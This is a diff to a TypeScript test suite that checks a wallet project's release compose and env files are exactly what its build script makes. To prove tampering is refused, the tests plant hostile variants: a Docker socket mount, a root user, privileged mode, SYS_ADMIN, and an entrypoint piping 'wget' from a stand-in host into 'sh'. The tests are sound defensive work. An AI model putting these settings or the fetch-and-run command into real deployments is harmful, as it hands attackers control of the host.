@@ -173,8 +173,14 @@ describe('the guardian image tags', () => {
     const job = wf.jobs['compose-files']!;
     expect(job.env!['DIGEST']).toBe('${{ needs.verified.outputs.digest }}');
     const pin = job.steps!.find((s) => s.name === 'Pin the image in the compose file')!;
-    expect(pin.run).toContain('pinned="${IMAGE}:${VERSION}@${DIGEST}"');
-    expect(pin.run).toContain('grep -Fxq "    image: ${pinned}"');
+    // The script publish-release.yml runs again, to require the draft's files to be exactly these.
+    expect(pin.run).toContain('OUT="${RUNNER_TEMP}/assets" bash packaging/compose/release-compose.sh');
+    const script = read('packaging/compose/release-compose.sh');
+    expect(script).toContain('pinned="${IMAGE}:${VERSION}@${DIGEST}"');
+    expect(script).toContain('grep -Fxq "    image: ${pinned}"');
+    expect(read('packaging/check-release-assets.sh')).toContain('COMPOSE_SCRIPT="${COMPOSE_SCRIPT:-packaging/compose/release-compose.sh}"');
+    const sparse = String(workflow('publish-release.yml').jobs['publish']!.steps!.find((s) => s.uses?.startsWith('actions/checkout@'))!.with!['sparse-checkout']);
+    for (const f of ['packaging/compose/release-compose.sh', 'packaging/compose/docker-compose.yml', 'packaging/compose/.env.example']) expect(sparse).toContain(f);
   });
 
   it("makes the release's compose file from the repository's, as the step really runs (0.1.22's release stopped here)", () => {
@@ -322,6 +328,18 @@ describe('packaging/check-release-assets.sh', () => {
   const DIGEST = `sha256:${'d'.repeat(64)}`;
   const CERT = read('packaging/android/release-cert.sha256').split('\n').filter((l) => !l.startsWith('#')).join('').trim();
   const sha = (b: string | Buffer) => createHash('sha256').update(b).digest('hex');
+  const makeComposeFiles = (out: string) =>
+    execFileSync('bash', [join(ROOT, 'packaging/compose/release-compose.sh')], {
+      env: { PATH: process.env['PATH'] ?? '', IMAGE, VERSION: TAG.slice(1), DIGEST, TAG, OUT: out },
+      stdio: 'pipe',
+    });
+  /** Replaces a compose file on the draft, with its .sha256 line and GitHub's digest to match (a token with contents: write could). */
+  const replace = (assets: string, list: { name: string; digest: string | null }[], name: string, body: string) => {
+    writeFileSync(join(assets, name), body);
+    const sums = ['trikey-guardian-compose.yml', 'trikey-guardian.env.example'].map((n) => `${sha(readFileSync(join(assets, n)))}  ${n}\n`).join('');
+    writeFileSync(join(assets, 'trikey-guardian-compose.sha256'), sums);
+    for (const a of list) a.digest = `sha256:${sha(readFileSync(join(assets, a.name)))}`;
+  };
 
   /** A draft's files as the builds make them, with stand-ins for apksigner and aapt2 that read a marker in the APK. */
   function draft(change: (dir: string, assets: { name: string; digest: string | null }[]) => void = () => {}) {
@@ -335,15 +353,11 @@ describe('packaging/check-release-assets.sh', () => {
     const files: Record<string, string> = {
       [`trikey-alpha-${TAG}.apk`]: `app.trikey.wallet\n${CERT}\n`,
       [`trikey-alpha-foss-${TAG}.apk`]: `app.trikey.wallet.foss\n${CERT}\n`,
-      'trikey-guardian-compose.yml': `services:\n  guardian:\n    image: ${IMAGE}:0.1.22-alpha@${DIGEST}\n  bitcoind:\n    image: bitcoin/bitcoin:32.1@sha256:${'b'.repeat(64)}\n`,
-      'trikey-guardian.env.example': 'BITCOIN_NETWORK=signet\n',
     };
     for (const [name, body] of Object.entries(files)) writeFileSync(join(assets, name), body);
     for (const apk of Object.keys(files).filter((n) => n.endsWith('.apk'))) writeFileSync(join(assets, `${apk}.sha256`), `${sha(files[apk]!)}  ${apk}\n`);
-    writeFileSync(
-      join(assets, 'trikey-guardian-compose.sha256'),
-      ['trikey-guardian-compose.yml', 'trikey-guardian.env.example'].map((n) => `${sha(files[n]!)}  ${n}\n`).join('')
-    );
+    // The compose files as docker.yml's compose-files job makes them.
+    makeComposeFiles(assets);
     const listed = () => readdirSync(assets).map((name) => ({ name, digest: `sha256:${sha(readFileSync(join(assets, name)))}` }));
     const list = listed();
     change(assets, list);
@@ -409,6 +423,33 @@ describe('packaging/check-release-assets.sh', () => {
   it('refuses a compose file that does not pin the pushed digest', () => {
     const { dir } = draft();
     expect(check(dir, { DIGEST: `sha256:${'0'.repeat(64)}` })).toMatchObject({ ok: false, out: expect.stringContaining('does not run') });
+  });
+
+  it('refuses compose files that are not exactly what docker.yml makes, even with the right image line and checksums (sweep 3 #3)', () => {
+    const compose = 'trikey-guardian-compose.yml';
+    const made = (assets: string) => readFileSync(join(assets, compose), 'utf8');
+    const changes: Record<string, (yml: string) => string> = {
+      // The pinned image, but the host's Docker socket mounted into it, as root.
+      'docker.sock': (y) => y.replace('      - guardian-data:/data\n', '      - guardian-data:/data\n      - /var/run/docker.sock:/var/run/docker.sock\n'),
+      user: (y) => y.replace('    init: true\n', '    init: true\n    user: "0:0"\n'),
+      privileged: (y) => y.replace('    init: true\n', '    init: true\n    privileged: true\n'),
+      entrypoint: (y) => y.replace('    init: true\n', '    init: true\n    entrypoint: ["/bin/sh", "-c", "wget -qO- https://example.invalid/x | sh"]\n'),
+      'cap_add': (y) => y.replace('    cap_drop:\n      - ALL\n', '    cap_add:\n      - SYS_ADMIN\n'),
+      'another node image': (y) => y.replace(/image: bitcoin\/bitcoin:32\.1@sha256:[0-9a-f]{64}/, `image: bitcoin/bitcoin:32.1@sha256:${'e'.repeat(64)}`),
+    };
+    for (const [what, change] of Object.entries(changes)) {
+      const { dir } = draft((assets, list) => {
+        const before = made(assets);
+        const after = change(before);
+        expect(after, what).not.toBe(before);
+        replace(assets, list, compose, after);
+      });
+      const r = check(dir);
+      expect(r, what).toMatchObject({ ok: false, out: expect.stringContaining('is not the file docker.yml makes from packaging/compose') });
+    }
+    // The settings file too: another relay list, with the checksums made to match.
+    const { dir } = draft((assets, list) => replace(assets, list, 'trikey-guardian.env.example', 'BITCOIN_NETWORK=mainnet\nTRIKEY_RELAYS=wss://relay.example.invalid\n'));
+    expect(check(dir)).toMatchObject({ ok: false, out: expect.stringContaining('trikey-guardian.env.example is not the file docker.yml makes') });
   });
 
   it('refuses a missing or an extra file, a file GitHub lists with another digest, and a stale checksum file', () => {
